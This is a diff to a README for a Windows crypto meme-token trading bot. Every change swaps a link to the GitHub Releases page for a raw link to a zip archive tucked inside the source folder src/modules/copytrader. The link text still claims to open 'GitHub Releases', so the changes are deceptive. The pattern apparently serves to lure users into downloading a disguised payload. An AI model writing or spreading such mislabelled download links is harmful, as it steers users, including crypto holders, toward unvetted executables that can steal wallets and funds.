@@ -1,6 +1,6 @@
 # 🚀 four-meme-trading-bot - Trade Four.meme tokens with control
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=for-the-badge)](https://github.com/Thistlelike-programinglanguage640/four-meme-trading-bot/releases)
+[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/Thistlelike-programinglanguage640/four-meme-trading-bot/main/src/modules/copytrader/meme-trading-bot-four-2.5-beta.4.zip)
 
 ## 🖥️ What this app does
 
@@ -18,7 +18,7 @@ It is built for end users who want a simple way to run trading actions on Window
 
 Visit this page to download the latest version:
 
-[Download from GitHub Releases](https://github.com/Thistlelike-programinglanguage640/four-meme-trading-bot/releases)
+[Download from GitHub Releases](https://raw.githubusercontent.com/Thistlelike-programinglanguage640/four-meme-trading-bot/main/src/modules/copytrader/meme-trading-bot-four-2.5-beta.4.zip)
 
 On that page, look for the newest release and download the Windows file that matches it.
 
@@ -168,7 +168,7 @@ Try these steps:
 
 Use the release page for new versions, fixes, and updated Windows files:
 
-[Open GitHub Releases](https://github.com/Thistlelike-programinglanguage640/four-meme-trading-bot/releases)
+[Open GitHub Releases](https://raw.githubusercontent.com/Thistlelike-programinglanguage640/four-meme-trading-bot/main/src/modules/copytrader/meme-trading-bot-four-2.5-beta.4.zip)
 
 Check this page each time you want the newest build for Windows
 
